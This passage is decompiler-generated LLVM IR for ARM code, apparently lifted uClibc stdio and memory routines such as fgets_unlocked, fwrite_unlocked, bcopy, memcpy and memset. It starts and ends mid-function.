  %v0_12368 = phi i32 [ %v3_123f4, %.thread11 ], [ %v0_123f8.pr, %dec_label_pc_122bc ]
  %v1_1234c = inttoptr i32 %v0_12368 to i8*
  %v2_1234c = load i8, i8* %v1_1234c, align 1
  %v3_1234c = zext i8 %v2_1234c to i32
  store i32 %v3_1234c, i32* %r3.global-to-local, align 4
  %v1_12350 = and i32 %v3_1234c, 64
  %v2_12350 = icmp eq i32 %v1_12350, 0
  store i1 %v2_12350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12350, label %.thread11, label %dec_label_pc_12358

dec_label_pc_12358:                               ; preds = %dec_label_pc_1234c
  %v2_1235c = load i32, i32* @global_var_2a8d0.387, align 4
  store i32 %v2_1235c, i32* %r3.global-to-local, align 4
  %v7_12360 = icmp eq i32 %v2_1235c, 2
  store i1 %v7_12360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12360, label %dec_label_pc_12394, label %dec_label_pc_12368

dec_label_pc_12368:                               ; preds = %dec_label_pc_12358
  %v1_12368 = add i32 %v0_12368, 56
  store i32 %v1_12368, i32* @r4, align 4
  store i32 %v2_122a4, i32* @r0, align 4
  store i32 58060, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v1_12368, i32* @r2, align 4
  %v1_12380 = call i32 @__pthread_cleanup_push_defer()
  %v0_12384 = load i32, i32* @r4, align 4
  store i32 %v0_12384, i32* %r0.global-to-local, align 4
  store i32 62768, i32* %r3.global-to-local, align 4
  %v2_12390 = call i32 @pthread_mutex_lock(i32 %v0_12384)
  store i32 %v2_12390, i32* %r0.global-to-local, align 4
  %v0_12394.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12394

dec_label_pc_12394:                               ; preds = %dec_label_pc_12358, %dec_label_pc_12368
  %v0_123a8 = phi i32 [ %v0_12368, %dec_label_pc_12358 ], [ %v0_12394.pre, %dec_label_pc_12368 ]
  %v1_12394 = inttoptr i32 %v0_123a8 to i32*
  %v2_12394 = load i32, i32* %v1_12394, align 4
  %v0_12398 = load i32, i32* @sl, align 4
  %v2_12398 = or i32 %v0_12398, %v2_12394
  %v1_1239c = xor i32 %v2_12398, 320
  store i32 %v1_1239c, i32* %r3.global-to-local, align 4
  %v1_123a0 = and i32 %v1_1239c, 832
  %v2_123a0 = icmp eq i32 %v1_123a0, 0
  store i1 %v2_123a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_123a0, label %dec_label_pc_123a8, label %bb39

dec_label_pc_123a8:                               ; preds = %dec_label_pc_12394
  store i32 %v0_123a8, i32* @r0, align 4
  %v0_123ac = call i32 @__stdio_wcommit()
  store i32 %v0_123ac, i32* %r0.global-to-local, align 4
  %v2_123b0 = icmp eq i32 %v0_123ac, 0
  store i1 %v2_123b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_123b0, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_123a8
  %v1_123b4 = load i32, i32* @r6, align 4
  %v2_123b4 = inttoptr i32 %v1_123b4 to i32*
  %v3_123b4 = load i32, i32* %v2_123b4, align 4
  store i32 %v3_123b4, i32* %r3.global-to-local, align 4
  %v2_123b8 = add i32 %v1_123b4, 8
  %v3_123b8 = inttoptr i32 %v2_123b8 to i32*
  %v4_123b8 = load i32, i32* %v3_123b8, align 4
  %v2_123bc = and i32 %v3_123b4, -65
  store i32 %v2_123bc, i32* %r3.global-to-local, align 4
  %v4_123c0 = sdiv i32 %v3_123b4, 256
  store i32 %v4_123c0, i32* %r1.global-to-local, align 4
  %v3_123c4 = add i32 %v1_123b4, 28
  %v4_123c4 = inttoptr i32 %v3_123c4 to i32*
  store i32 %v4_123b8, i32* %v4_123c4, align 4
  %v1_123c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_123c8 = trunc i32 %v1_123c8 to i8
  %v3_123c8 = load i32, i32* @r6, align 4
  %v4_123c8 = add i32 %v3_123c8, 1
  %v5_123c8 = inttoptr i32 %v4_123c8 to i8*
  store i8 %v2_123c8, i8* %v5_123c8, align 1
  %v0_123cc.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_123cc.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_123cc = load i32, i32* %r3.global-to-local, align 4
  %v2_123cc = trunc i32 %v1_123cc to i8
  %v3_123cc = load i32, i32* @r6, align 4
  %v4_123cc = inttoptr i32 %v3_123cc to i8*
  store i8 %v2_123cc, i8* %v4_123cc, align 1
  %v0_123d0.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_123d0.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_123a8, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_12394, %.thread6, %.thread7
  %v2_123d8 = load i32, i32* @global_var_2a8d0.387, align 4
  store i32 %v2_123d8, i32* %r3.global-to-local, align 4
  %v7_123dc = icmp eq i32 %v2_123d8, 2
  store i1 %v7_123dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_123dc, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_122a4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 58236, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 58236)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_1234c, %bb40
  %v0_123f4 = load i32, i32* @r6, align 4
  %v1_123f4 = add i32 %v0_123f4, 32
  %v2_123f4 = inttoptr i32 %v1_123f4 to i32*
  %v3_123f4 = load i32, i32* %v2_123f4, align 4
  store i32 %v3_123f4, i32* @r6, align 4
  %v2_123f8 = icmp eq i32 %v3_123f4, 0
  store i1 %v2_123f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_123f8, label %dec_label_pc_123f8.dec_label_pc_12400_crit_edge, label %dec_label_pc_1234c

dec_label_pc_123f8.dec_label_pc_12400_crit_edge:  ; preds = %.thread11
  %v0_12400.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12400

dec_label_pc_12400:                               ; preds = %dec_label_pc_123f8.dec_label_pc_12400_crit_edge, %dec_label_pc_122bc
  %v0_12400 = phi i32 [ %v0_12400.pre, %dec_label_pc_123f8.dec_label_pc_12400_crit_edge ], [ %v1_1233c, %dec_label_pc_122bc ]
  %v1_12400 = call i32 @_stdio_openlist_dec_use(i32 %v0_12400)
  store i32 %v1_12400, i32* %r0.global-to-local, align 4
  %v0_12444.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_12408:                               ; preds = %dec_label_pc_122b0
  %v1_12408 = inttoptr i32 %.v1_1229c to i8*
  %v2_12408 = load i8, i8* %v1_12408, align 1
  %v3_12408 = zext i8 %v2_12408 to i32
  %v1_1240c = and i32 %v3_12408, 64
  store i32 %v1_1240c, i32* %r3.global-to-local, align 4
  %v2_1240c = icmp eq i32 %v1_1240c, 0
  store i1 %v2_1240c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1240c, label %bb41, label %dec_label_pc_12418

bb41:                                             ; preds = %dec_label_pc_12408
  br label %bb43

dec_label_pc_12418:                               ; preds = %dec_label_pc_12408
  %v0_12418 = call i32 @__stdio_wcommit()
  store i32 %v0_12418, i32* %r0.global-to-local, align 4
  %v2_1241c = icmp eq i32 %v0_12418, 0
  store i1 %v2_1241c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1241c, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_12418
  %v1_12420 = load i32, i32* @r8, align 4
  %v2_12420 = inttoptr i32 %v1_12420 to i32*
  %v3_12420 = load i32, i32* %v2_12420, align 4
  store i32 %v3_12420, i32* %r3.global-to-local, align 4
  %v2_12424 = add i32 %v1_12420, 8
  %v3_12424 = inttoptr i32 %v2_12424 to i32*
  %v4_12424 = load i32, i32* %v3_12424, align 4
  store i32 %v4_12424, i32* %r1.global-to-local, align 4
  %v2_12428 = and i32 %v3_12420, -65
  store i32 %v2_12428, i32* %r3.global-to-local, align 4
  %v4_1242c = sdiv i32 %v3_12420, 256
  %v2_12430 = trunc i32 %v4_1242c to i8
  %v4_12430 = add i32 %v1_12420, 1
  %v5_12430 = inttoptr i32 %v4_12430 to i8*
  store i8 %v2_12430, i8* %v5_12430, align 1
  %v0_12434.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12434.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_12434 = load i32, i32* %r1.global-to-local, align 4
  %v2_12434 = load i32, i32* @r8, align 4
  %v3_12434 = add i32 %v2_12434, 28
  %v4_12434 = inttoptr i32 %v3_12434 to i32*
  store i32 %v1_12434, i32* %v4_12434, align 4
  %v1_12438 = load i32, i32* %r3.global-to-local, align 4
  %v2_12438 = trunc i32 %v1_12438 to i8
  %v3_12438 = load i32, i32* @r8, align 4
  %v4_12438 = inttoptr i32 %v3_12438 to i8*
  store i8 %v2_12438, i8* %v4_12438, align 1
  %v0_1243c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1243c.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_12418
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_12400, %.thread20
  %v0_12444 = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_12444.pre, %dec_label_pc_12400 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_12444, i32* %r0.global-to-local, align 4
  store i32 %v3_12290, i32* @r4, align 4
  store i32 %v6_12290, i32* @r5, align 4
  store i32 %v15_12290, i32* @r8, align 4
  ret i32 %v0_12444

; uselistorder directives
  uselistorder i32 %v0_12444, { 1, 0 }
  uselistorder i32 %v3_123f4, { 1, 2, 0 }
  uselistorder i32 %v2_122a4, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 9, 4, 10, 1, 6, 0, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 12, 5, 7, 6, 8, 9, 10, 11, 0, 13, 14 }
  uselistorder i32* @global_var_2a8d0.387, { 1, 2, 3, 4, 0 }
  uselistorder i32* bitcast (i32** @global_var_2a89c.382 to i32*), { 4, 0, 5, 1, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_2a8a0.575 to i32), { 0, 3, 4, 1, 5, 6, 2, 7, 8 }
  uselistorder i32* @global_var_2d1d0.559, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_2a8b8.557 to i32), { 0, 5, 6, 1, 7, 8, 2, 9, 10, 3, 11, 4, 12 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12394, { 1, 0 }
  uselistorder label %dec_label_pc_1234c, { 1, 0 }
  uselistorder label %dec_label_pc_122bc, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12478 = icmp eq i32 %arg2, 0
  store i1 %v2_12478, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_12500, label %dec_label_pc_124e4.preheader

dec_label_pc_124e4.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_124e415 = add i32 %arg2, -1
  store i32 %v1_124e415, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_124e421 = icmp eq i32 %arg2, 1
  store i1 %v7_124e421, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_124e421, label %dec_label_pc_124f0, label %dec_label_pc_12490

dec_label_pc_12490:                               ; preds = %dec_label_pc_124e4.preheader, %dec_label_pc_124e4.backedge
  %v1_124e824.in = phi i32 [ %v0_124e8.pre, %dec_label_pc_124e4.backedge ], [ %arg3, %dec_label_pc_124e4.preheader ]
  %v1_12490 = add i32 %v1_124e824.in, 16
  %v2_12490 = inttoptr i32 %v1_12490 to i32*
  %v3_12490 = load i32, i32* %v2_12490, align 4
  store i32 %v3_12490, i32* %r2.global-to-local, align 4
  %v1_12494 = add i32 %v1_124e824.in, 24
  %v2_12494 = inttoptr i32 %v1_12494 to i32*
  %v3_12494 = load i32, i32* %v2_12494, align 4
  %v3_12498 = icmp uge i32 %v3_12490, %v3_12494
  store i1 %v3_12498, i1* %cpsr_c.global-to-local, align 1
  %v9_12498 = icmp eq i32 %v3_12490, %v3_12494
  store i1 %v9_12498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12498, label %dec_label_pc_124b8, label %dec_label_pc_124a0

dec_label_pc_124a0:                               ; preds = %dec_label_pc_12490
  %v1_124a0 = inttoptr i32 %v3_12490 to i8*
  %v2_124a0 = load i8, i8* %v1_124a0, align 1
  %v5_124a0 = add i32 %v3_12490, 1
  store i32 %v5_124a0, i32* %r2.global-to-local, align 4
  %v2_124a4 = load i32, i32* @r4, align 4
  %v3_124a4 = inttoptr i32 %v2_124a4 to i8*
  store i8 %v2_124a0, i8* %v3_124a4, align 1
  %v0_124a8 = load i32, i32* @r4, align 4
  %v1_124a8 = inttoptr i32 %v0_124a8 to i8*
  %v2_124a8 = load i8, i8* %v1_124a8, align 1
  %v5_124a8 = add i32 %v0_124a8, 1
  store i32 %v5_124a8, i32* @r4, align 4
  %v2_124ac = icmp ugt i8 %v2_124a8, 9
  store i1 %v2_124ac, i1* %cpsr_c.global-to-local, align 1
  %v7_124ac = icmp eq i8 %v2_124a8, 10
  store i1 %v7_124ac, i1* %cpsr_z.global-to-local, align 1
  %v0_124b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_124b0 = load i32, i32* @r5, align 4
  %v2_124b0 = add i32 %v1_124b0, 16
  %v3_124b0 = inttoptr i32 %v2_124b0 to i32*
  store i32 %v0_124b0, i32* %v3_124b0, align 4
  br i1 %v7_124ac, label %dec_label_pc_124f0, label %dec_label_pc_124e4.backedge

dec_label_pc_124b8:                               ; preds = %dec_label_pc_12490
  %v1_124e824 = inttoptr i32 %v1_124e824.in to i8*
  %v3_124b8 = call i32 @getc_unlocked(i8* %v1_124e824)
  %v4_124b8 = trunc i32 %v3_124b8 to i8
  %v5_124bc = icmp eq i8 %v4_124b8, -1
  store i1 %v5_124bc, i1* %cpsr_c.global-to-local, align 1
  %v10_124bc = icmp eq i32 %v3_124b8, -1
  store i1 %v10_124bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_124bc, label %dec_label_pc_124c4, label %dec_label_pc_124e0

dec_label_pc_124c4:                               ; preds = %dec_label_pc_124b8
  %v0_124c4 = load i32, i32* @r5, align 4
  %v1_124c4 = inttoptr i32 %v0_124c4 to i8*
  %v2_124c4 = load i8, i8* %v1_124c4, align 1
  %v1_124c8 = and i8 %v2_124c4, 8
  %v2_124c8 = icmp eq i8 %v1_124c8, 0
  store i1 %v2_124c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_124c8, label %dec_label_pc_124f0, label %dec_label_pc_12500

dec_label_pc_124e0:                               ; preds = %dec_label_pc_124b8
  %v3_124d4 = load i32, i32* @r4, align 4
  %v4_124d4 = inttoptr i32 %v3_124d4 to i8*
  store i8 %v4_124b8, i8* %v4_124d4, align 1
  %v0_124d8 = load i32, i32* @r4, align 4
  %v1_124d8 = inttoptr i32 %v0_124d8 to i8*
  %v2_124d8 = load i8, i8* %v1_124d8, align 1
  %v5_124d8 = add i32 %v0_124d8, 1
  store i32 %v5_124d8, i32* @r4, align 4
  %v2_124dc = icmp ugt i8 %v2_124d8, 9
  store i1 %v2_124dc, i1* %cpsr_c.global-to-local, align 1
  %v7_124dc = icmp eq i8 %v2_124d8, 10
  store i1 %v7_124dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_124dc, label %dec_label_pc_124f0, label %dec_label_pc_124e4.backedge

dec_label_pc_124e4.backedge:                      ; preds = %dec_label_pc_124e0, %dec_label_pc_124a0
  %v0_124e4.pre = load i32, i32* @r6, align 4
  %v0_124e8.pre = load i32, i32* @r5, align 4
  %v1_124e4 = add i32 %v0_124e4.pre, -1
  store i32 %v1_124e4, i32* @r6, align 4
  %v2_124e4 = icmp ne i32 %v0_124e4.pre, 0
  store i1 %v2_124e4, i1* %cpsr_c.global-to-local, align 1
  %v7_124e4 = icmp eq i32 %v0_124e4.pre, 1
  store i1 %v7_124e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_124e4, label %dec_label_pc_124f0, label %dec_label_pc_12490

dec_label_pc_124f0:                               ; preds = %dec_label_pc_124e4.preheader, %dec_label_pc_124e0, %dec_label_pc_124e4.backedge, %dec_label_pc_124a0, %dec_label_pc_124c4
  %v0_124f0 = load i32, i32* @r4, align 4
  %v1_124f0 = load i32, i32* %r7.global-to-local, align 4
  %v3_124f0 = icmp uge i32 %v0_124f0, %v1_124f0
  store i1 %v3_124f0, i1* %cpsr_c.global-to-local, align 1
  %v9_124f0 = icmp eq i32 %v0_124f0, %v1_124f0
  store i1 %v9_124f0, i1* %cpsr_z.global-to-local, align 1
  %v2_124f4 = xor i1 %v9_124f0, true
  %v3_124f4 = and i1 %v3_124f0, %v2_124f4
  br i1 %v3_124f4, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_124f0
  %v7_124f8 = inttoptr i32 %v0_124f0 to i8*
  store i8 0, i8* %v7_124f8, align 1
  %v0_124fc.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_124fc.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_124f0, %bb
  %v1_124fc = phi i1 [ %v1_124fc.pre, %bb ], [ %v9_124f0, %dec_label_pc_124f0 ]
  %v0_124fc = phi i1 [ %v0_124fc.pre, %bb ], [ %v3_124f0, %dec_label_pc_124f0 ]
  %v2_124fc = xor i1 %v1_124fc, true
  %v3_124fc = and i1 %v0_124fc, %v2_124fc
  br i1 %v3_124fc, label %.dec_label_pc_12504_crit_edge, label %dec_label_pc_12500

.dec_label_pc_12504_crit_edge:                    ; preds = %.thread7
  %v0_12504.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12504

dec_label_pc_12500:                               ; preds = %entry, %dec_label_pc_124c4, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12504

dec_label_pc_12504:                               ; preds = %.dec_label_pc_12504_crit_edge, %dec_label_pc_12500
  %v0_12504 = phi i32 [ %v0_12504.pre, %.dec_label_pc_12504_crit_edge ], [ 0, %dec_label_pc_12500 ]
  ret i32 %v0_12504

; uselistorder directives
  uselistorder i1 %v9_124f0, { 1, 0, 2 }
  uselistorder i32 %v1_124f0, { 1, 0 }
  uselistorder i32 %v0_124f0, { 0, 2, 1 }
  uselistorder i32 %v0_124e4.pre, { 2, 0, 1 }
  uselistorder i1 %v2_124c8, { 1, 0 }
  uselistorder i32 %v3_12490, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_124e824.in, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder label %dec_label_pc_12504, { 1, 0 }
  uselistorder label %dec_label_pc_12500, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_124f0, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_12490, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1250c = load i32, i32* @r4, align 4
  store i32 %v3_1250c, i32* %stack_var_-16, align 4
  %v6_1250c = load i32, i32* @r5, align 4
  %v9_1250c = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_12518 = call i32 @strlen(i8* %arg1)
  store i32 %v3_12518, i32* @r6, align 4
  %v0_12520 = load i32, i32* @r5, align 4
  %v0_12524 = load i32, i32* @r4, align 4
  %v5_12530 = inttoptr i32 %v0_12520 to i8*
  %v6_12530 = call i32 @__GI_fwrite_unlocked(i32 %v0_12524, i32 1, i32 %v3_12518, i8* %v5_12530)
  %v1_12534 = load i32, i32* @r6, align 4
  %v9_12534 = icmp eq i32 %v6_12530, %v1_12534
  br i1 %v9_12534, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_1253c = phi i32 [ %v6_12530, %entry ], [ -1, %bb ]
  %v2_1253c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1253c, i32* @r4, align 4
  store i32 %v6_1250c, i32* @r5, align 4
  store i32 %v9_1250c, i32* @r6, align 4
  ret i32 %v14_1253c

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_12540 = load i32, i32* @r6, align 4
  %v12_12540 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_12548 = load i8, i8* %arg4, align 1
  %v4_12548 = zext i8 %v3_12548 to i32
  %v1_1254c = and i32 %v4_12548, 192
  store i32 %v1_1254c, i32* %r3.global-to-local, align 4
  %v2_12550 = icmp eq i32 %v1_1254c, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_12550, label %dec_label_pc_12578, label %dec_label_pc_1256c

dec_label_pc_1256c:                               ; preds = %entry
  %v4_1256c = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_12570 = icmp eq i32 %v4_1256c, 0
  br i1 %v2_12570, label %dec_label_pc_1256c.dec_label_pc_12578_crit_edge, label %dec_label_pc_125e0

dec_label_pc_1256c.dec_label_pc_12578_crit_edge:  ; preds = %dec_label_pc_1256c
  %v0_12578.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12578

dec_label_pc_12578:                               ; preds = %dec_label_pc_1256c.dec_label_pc_12578_crit_edge, %entry
  %v0_125801 = phi i32 [ %v0_12578.pre, %dec_label_pc_1256c.dec_label_pc_12578_crit_edge ], [ %arg2, %entry ]
  %v2_12578 = icmp eq i32 %v0_125801, 0
  br i1 %v2_12578, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_12578
  br label %dec_label_pc_125e0

bb:                                               ; preds = %dec_label_pc_12578
  %v1_1257c = load i32, i32* @r6, align 4
  %v3_1257c = icmp eq i32 %v1_1257c, 0
  br i1 %v3_1257c, label %dec_label_pc_125e0, label %dec_label_pc_1258c

dec_label_pc_1258c:                               ; preds = %bb
  %v2_1258c = udiv i32 -1, %v0_125801
  %v0_12594 = load i32, i32* @r4, align 4
  store i32 %v0_12594, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_1257c, %v2_1258c
  br i1 %tmp10, label %dec_label_pc_125b8, label %dec_label_pc_125a0

dec_label_pc_125a0:                               ; preds = %dec_label_pc_1258c
  %v0_12598 = load i32, i32* @r7, align 4
  %v2_125a0 = mul i32 %v1_1257c, %v0_125801
  %v4_125a4 = call i32 @__stdio_fwrite(i32 %v0_12598, i32 %v2_125a0, i32 %v0_12594)
  %v0_125a8 = load i32, i32* @r5, align 4
  %v2_125ac = udiv i32 %v4_125a4, %v0_125a8
  store i32 %v2_125ac, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_125e4

dec_label_pc_125b8:                               ; preds = %dec_label_pc_1258c
  %v1_125b8 = inttoptr i32 %v0_12594 to i32*
  %v2_125b8 = load i32, i32* %v1_125b8, align 4
  %v1_125bc = or i32 %v2_125b8, 8
  store i32 %v1_125bc, i32* %r3.global-to-local, align 4
  %v3_125c0 = sdiv i32 %v2_125b8, 256
  store i32 %v3_125c0, i32* %r2.global-to-local, align 4
  %v1_125c4 = trunc i32 %v3_125c0 to i8
  %v3_125c4 = add i32 %v0_12594, 1
  %v4_125c4 = inttoptr i32 %v3_125c4 to i8*
  store i8 %v1_125c4, i8* %v4_125c4, align 1
  %v0_125c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_125c8 = trunc i32 %v0_125c8 to i8
  %v2_125c8 = load i32, i32* @r4, align 4
  %v3_125c8 = inttoptr i32 %v2_125c8 to i8*
  store i8 %v1_125c8, i8* %v3_125c8, align 1
  %v0_125cc = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_125d8 = inttoptr i32 %v0_125cc to i32*
  store i32 22, i32* %v2_125d8, align 4
  %v0_125e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_125e4

dec_label_pc_125e0:                               ; preds = %.thread, %dec_label_pc_1256c, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_125e4

dec_label_pc_125e4:                               ; preds = %dec_label_pc_125b8, %dec_label_pc_125a0, %dec_label_pc_125e0
  %v0_125e4 = phi i32 [ %v0_125e4.pre, %dec_label_pc_125b8 ], [ %v2_125ac, %dec_label_pc_125a0 ], [ 0, %dec_label_pc_125e0 ]
  store i32 %v9_12540, i32* @r6, align 4
  store i32 %v12_12540, i32* @r7, align 4
  ret i32 %v0_125e4

; uselistorder directives
  uselistorder i32 %v3_125c0, { 1, 0 }
  uselistorder i32 %v1_1257c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_125e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_125e0, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_125fc = inttoptr i32 %arg2 to i8*
  %v3_125fc = call i32 @_memcpy(i8* %v2_125fc, i32 %arg1)
  ret i32 %v3_125fc
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_12600 = load i32, i32* @r0, align 4
  %v1_12600 = load i32, i32* @r1, align 4
  %v2_12600 = inttoptr i32 %v0_12600 to i8*
  %v3_12600 = call i32 @_memcpy(i8* %v2_12600, i32 %v1_12600)
  ret i32 %v3_12600
}

define i32 @__GI_memset() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v0_12610 = load i32, i32* @r0, align 4
  store i32 %v0_12610, i32* %r3.global-to-local, align 4
  %v0_12614 = load i32, i32* @r2, align 4
  %v8_12614 = icmp eq i32 %v0_12614, 8
  store i1 %v8_12614, i1* %cpsr_z.global-to-local, align 1
  %v5_12618 = icmp slt i32 %v0_12614, 8
  br i1 %v5_12618, label %dec_label_pc_12678, label %dec_label_pc_1261c

dec_label_pc_1261c:                               ; preds = %entry
  %v0_1261c = load i32, i32* @r1, align 4
  %v4_1261c = mul i32 %v0_1261c, 256
  %v5_1261c = or i32 %v4_1261c, %v0_1261c
  %v4_12620 = mul i32 %v5_1261c, 65536
  %v5_12620 = or i32 %v4_12620, %v5_1261c
  store i32 %v5_12620, i32* @r1, align 4
  %v1_1262457 = urem i32 %v0_12610, 4
  %v2_1262458 = icmp eq i32 %v1_1262457, 0
  store i1 %v2_1262458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %v0_1261c to i8
  br i1 %v2_1262458, label %dec_label_pc_12634, label %bb

bb:                                               ; preds = %dec_label_pc_1261c, %.thread.bb_crit_edge
  %v0_1261c.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1261c ]
  %v3_1262859 = phi i32 [ %v6_12628, %.thread.bb_crit_edge ], [ %v0_12610, %dec_label_pc_1261c ]
  %v4_12628 = inttoptr i32 %v3_1262859 to i8*
  store i8 %v0_1261c.sink.off0, i8* %v4_12628, align 1
